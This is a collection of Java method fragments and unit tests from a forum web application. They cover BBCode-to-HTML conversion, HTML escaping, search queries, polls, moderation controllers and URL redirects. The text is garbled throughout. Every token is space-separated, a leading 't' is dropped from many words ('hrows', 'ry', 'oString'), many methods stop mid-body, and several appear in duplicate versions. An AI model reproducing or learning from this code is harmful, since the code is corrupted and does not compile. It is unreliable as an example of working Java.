public void estCodeBR ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code]test ntest[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" brush: plain; wrap-lines: false \" >test n ntest</pre></div><p> " , result ) ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;", " "}); return content; } 
public static String escapeHtmlBBcode ( String content ) { \r".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;", " ", ""}); return content; } 
public String show ( Connection db ) hrows SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | userTopic ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; ViewerCacher cacher = new ViewerCacher ( ) ; params . put ( " result " , cacher . get ( sv , false ) ) ; params . put ( " cached " , cacher . isFromCache ( ) ) ; params . put ( " ime " , cacher . getTime ( ) ) ; } return new ModelAndView ( " search " , params ) ; } 
public void estCodeJava ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code=java]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" brush: java; wrap-lines: false \" >test</pre></div><p> " , result ) ; } 
public void estCodeXXX ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code=xxx]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" brush: plain; wrap-lines: false \" >test</pre></div><p> " , result ) ; } 
public void processContent ( StringBuffer buffer ) { Matcher matcher = codePattern . matcher ( buffer ) ; while ( matcher . find ( ) ) { int start = matcher . start ( ) ; 
public void estCodeExcape ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div><p> " , result ) ; } 
public void estCodeBR ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code]test ntest[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>test n ntest</code></pre></div><p> " , result ) ; } 
public void estCodeJava ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code=java]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" language-java \" ><code>test</code></pre></div><p> " , result ) ; } 
public void estCodeXXX ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code=xxx]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>test</code></pre></div><p> " , result ) ; } 
public void estCodeTwo ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code]test[/code] [code]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>test</code></pre></div><p> <div class=code><pre class= \" no-highlight \" ><code>test</code></pre></div><p> " , result ) ; } 
public void processContent ( StringBuffer buffer ) { int end = 0 ; while ( rue ) { Matcher matcher = codePattern . matcher ( buffer ) ; 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#91;", "&#93;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public void estURLHighlight6 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( " (http:ozpp.ru/laws2/pravila-prod/tovar5.html) " ) ; formatter . enableUrlHighLightMode ( ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; formatter . setOutputLorcode ( rue ) ; assertEquals ( " ([url=http:ozpp.ru/laws2/pravila-prod/tovar5.html]http:ozpp.ru/laws2/pravila-prod/tovar5.html[/url]) " , formatter . process ( ) ) ; } 
public static int createPoll ( Connection db , String itle , List < String > pollList ) hrows SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , itle ) ; pst . executeUpdate ( ) ; ry { Poll poll = new Poll ( db , voteid ) ; for ( String variant : pollList ) { if ( variant . rim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } } catch ( PollNotFoundException ex ) { hrow new RuntimeException ( ex ) ; } return voteid ; } 
public ModelAndView showForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void updateMessageText ( Connection db , User editor ) hrows SQLException { PreparedStatement pstGet = db . prepareStatement ( " SELECT message FROM msgbase WHERE id=? FOR UPDATE " ) ; PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; PreparedStatement pstInfo = db . prepareStatement ( " INSERT INTO edit_info (msgid, editor, oldmessage) VALUES(?,?,?) " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new RuntimeException ( " Can't fetch previous message text " ) ; } pst . setString ( 1 , message ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; pstInfo . setInt ( 1 , msgid ) ; pstInfo . setInt ( 2 , editor . getId ( ) ) ; pstInfo . setString ( 3 , rs . getString ( " message " ) ) ; pstInfo . executeUpdate ( ) ; } 
public List < EditInfoDTO > loadEditInfo ( Connection db ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " ) ; pst . setInt ( 1 , msgid ) ; ResultSet rs = pst . executeQuery ( ) ; List < EditInfoDTO > list = null ; while ( rs . next ( ) ) { if ( list = = null ) { list = new ArrayList < EditInfoDTO > ( ) ; } EditInfoDTO dto = new EditInfoDTO ( ) ; dto . setId ( rs . getInt ( " id " ) ) ; dto . setEditdate ( rs . getTimestamp ( " editdate " ) ) ; dto . setEditor ( rs . getInt ( " editor " ) ) ; dto . setOldmessage ( rs . getString ( " oldmessage " ) ) ; dto . setMsgid ( rs . getInt ( " msgid " ) ) ; list . add ( dto ) ; } return list ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false ) Integer sectionId ) hrows Exception { Connection db = null ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView undelete ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView viewVote ( @RequestParam int voteid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( required = false ) Boolean sticky , @RequestParam ( required = false ) Boolean notop ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } if ( sticky = = null ) { sticky = false ; } if ( notop = = null ) { notop = false ; } if ( postscore < - 1 ) { postscore = 0 ; } if ( postscore > 500 ) { postscore = 500 ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView viewVote ( @RequestParam ( " vote " ) int voteid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showList ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static String showComments ( Connection db , User user , int offset , int limit ) hrows SQLException { DateFormat dateFormat = DateFormats . createDefault ( ) ; StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " opics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; pst . setString ( 1 , user . getNick ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . oString ( ) ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset ) hrows Exception { ModelAndView mv = new ModelAndView ( " show-comments " ) ; if ( offset < 0 ) { hrow new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView sameIP ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } return new ModelAndView ( " sameip " ) ; } 
public static List < Group > getGroups ( Connection db , Section section ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info,groups.longinfo,groups.resolvable FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; longInfo = rs . getString ( " longinfo " ) ; resolvable = rs . getBoolean ( " resolvable " ) ; } 
public boolean isResolvable ( ) { return his . resolvable ; } 
public boolean isResolved ( ) { return his . resolved ; } 
public void resolveMessage ( Connection db , boolean b ) hrows SQLException { PreparedStatement pstMsgbase = db . prepareStatement ( " UPDATE topics SET resolved=? WHERE id=? " ) ; pstMsgbase . setBoolean ( 1 , b ) ; pstMsgbase . setInt ( 2 , his . msgid ) ; pstMsgbase . executeUpdate ( ) ; } 
public ModelAndView modifyGroup ( @RequestParam ( " group " ) int id , @RequestParam ( " info " ) String info , @RequestParam ( " longinfo " ) String longInfo , @RequestParam ( value = " preview " , required = false ) String preview , @RequestParam ( value = " resolvable " , required = false ) String resolvable , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = dataSource . getConnection ( ) ; 
public void resolveMessage ( Connection db , boolean b ) hrows SQLException { PreparedStatement pstMsgbase = db . prepareStatement ( " UPDATE topics SET resolved=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " ) ; pstMsgbase . setBoolean ( 1 , b ) ; pstMsgbase . setInt ( 2 , his . msgid ) ; pstMsgbase . executeUpdate ( ) ; } 
public ModelAndView resolve ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( " msgid " ) int msgid , @RequestParam ( " resolve " ) String resolved ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public boolean isResolved ( ) { return resolved ; } 
public List < TopTenDaoImpl . TopTenMessageDTO > get ( ) { List < TopTenDaoImpl . TopTenMessageDTO > list = getTopTenDao ( ) . getMessages ( ) ; CollectionUtils . forAllDo ( list , new Closure ( ) { @Override public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; int mp = dto . getAnswers ( ) / itemsPerPage ; mp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? mp + 1 : mp ; dto . setPages ( mp ) ; } } ) ; return list ; } 
public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; int mp = dto . getAnswers ( ) / itemsPerPage ; mp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? mp + 1 : mp ; dto . setPages ( mp ) ; } 
public void estWolframURL ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [url]http:www.wolframalpha.com/input/?i=32177![/url] " ) ; assertEquals ( " <p><a href= \" http:www.wolframalpha.com/input/?i=32177! \" >http:www.wolframalpha.com/input/?i=32177!</a> " , result ) ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer o , RegexTag regex , String replacement ) { o . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { if ( ! URLUtil . isUrl ( m . group ( 1 ) ) ) { m . appendReplacement ( o , BAD_DATA ) ; } else { m . appendReplacement ( o , replacement ) ; } } m . appendTail ( o ) ; } 
public ModelAndView archiveList ( @RequestParam ( " section " ) int sectionid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView sendPassword ( @RequestParam ( " email " ) String useremail ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView doRegister ( HttpServletRequest request , @RequestParam String email ) hrows Exception { HttpSession session = request . getSession ( ) ; Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { boolean changeMode = " change " . equals ( request . getParameter ( " mode " ) ) ; 
public ModelAndView doRegister ( HttpServletRequest request , @RequestParam String email , @RequestParam ( required = false ) String own , @RequestParam ( required = false ) String info , @RequestParam ( required = false ) String name , @RequestParam ( required = false ) String url , @RequestParam ( required = false ) String password , @RequestParam ( required = false ) String password2 ) hrows Exception { HttpSession session = request . getSession ( ) ; Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { boolean changeMode = " change " . equals ( request . getParameter ( " mode " ) ) ; 
public static String htmlSpecialChars ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
public void estEscape ( ) { assertEquals ( " &lt;script&gt; " , HTMLFormatter . htmlSpecialChars ( " <script> " ) ) ; } 
public void estEscapeEntity ( ) { assertEquals ( " &nbsp; " , HTMLFormatter . htmlSpecialChars ( " &nbsp; " ) ) ; } 
public static String htmlSpecialChars ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
public void estEscapeEntity2 ( ) { assertEquals ( " &#41;&#41;&#41; " , HTMLFormatter . htmlSpecialChars ( " &#41;&#41;&#41; " ) ) ; } 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView moveTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam ( " moveto " ) int newgr ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView serverInfo ( ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView mainPage ( ) { return new ModelAndView ( " index " ) ; } 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) hrows Exception { return showUserTopics ( nick , offset , output , response ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick ) hrows Exception { return getInfo ( nick ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public View getInfo ( @RequestParam ( " nick " ) String nick ) hrows SQLException , UserNotFoundException { return new RedirectView ( " /people/ " + URLEncoder . encode ( nick ) + " /profile " ) ; } 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) hrows Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; ry { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public View showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output ) hrows Exception { if ( output ! = null ) { return new RedirectView ( " /people/ " + nick + " /?output=rss " ) ; } return new RedirectView ( " /people/ " + nick + " / " ) ; } 
public ModelAndView forum ( ) hrows Exception { return handleRequestInternal ( Section . SECTION_FORUM ) ; } 
public View forumOld ( ) { return new RedirectView ( " /forum " ) ; } 
public View forumOld ( ) { return new RedirectView ( " /forum/ " ) ; } 
public ModelAndView galleryArchive ( ) hrows Exception { return archiveList ( Section . SECTION_GALLERY ) ; } 
public View galleryArchiveOld ( ) hrows Exception { return new RedirectView ( " /gallery/archive/ " ) ; } 
public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " ag " , required = false ) String ag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) hrows Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " view-news.jsp " ) ; StringBuilder urlParams = new StringBuilder ( ) ; if ( sectionid ! = null ) { urlParams . append ( " section= " + Integer . oString ( sectionid ) ) ; } if ( ag ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( " & " ) ; } urlParams . append ( " ag= " + URLEncoder . encode ( ag ) ) ; } if ( groupid ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( " & " ) ; } urlParams . append ( " group= " + Integer . oString ( groupid ) ) ; } params . put ( " params " , urlParams ) ; ry { if ( month = = null ) { 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) hrows Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + " / " ) ; ry { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public View showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " output " , required = false ) String output ) hrows Exception { if ( output ! = null ) { return new RedirectView ( " /people/ " + nick + " /?output=rss " ) ; } return new RedirectView ( " /people/ " + nick + " / " ) ; } 
public ModelAndView gallery ( @RequestParam ( required = false ) Integer offset , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_GALLERY , null , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View galleryOldLink ( @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year ) { if ( offset ! = null ) { return new RedirectView ( " /gallery/?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( " /gallery/archive/ " + Integer . oString ( year ) + " / " + Integer . oString ( month ) ) ; } return new RedirectView ( " /gallery/ " ) ; } 
public ModelAndView galleryArchive ( @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( month , year , Section . SECTION_GALLERY , null , null , null , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/archive/ " + year + " / " + month + " / " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) hrows Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + " / " ) ; TODO params.put("archiveLink", "/people/"+nick+"/archive/"); try { response.setDateHeader("Expires", System.currentTimeMillis() + 60 * 1000); 
public Group getGroup ( Connection db , String name ) hrows SQLException , BadGroupException { PreparedStatement st = db . prepareStatement ( " SELECT id FROM groups WHERE section=? AND title=? " ) ; st . setInt ( 1 , id ) ; st . setString ( 2 , name ) ; ResultSet rs = st . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new BadGroupException ( " group not found " ) ; } return new Group ( db , rs . getInt ( 1 ) ) ; } 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( required = false ) Integer offset , HttpServletRequest request ) hrows Exception { Connection db = null ; Group group ; ry { db = LorDataSource . getConnection ( ) ; Section section = new Section ( db , Section . SECTION_FORUM ) ; group = section . getGroup ( db , groupName ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } return opics ( group . getId ( ) , offset , request , false ) ; } 
public static List < Group > getGroups ( Connection db , Section section ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, urlname, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info,groups.longinfo,groups.resolvable FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; urlName = rs . getString ( " urlname " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; longInfo = rs . getString ( " longinfo " ) ; resolvable = rs . getBoolean ( " resolvable " ) ; } 
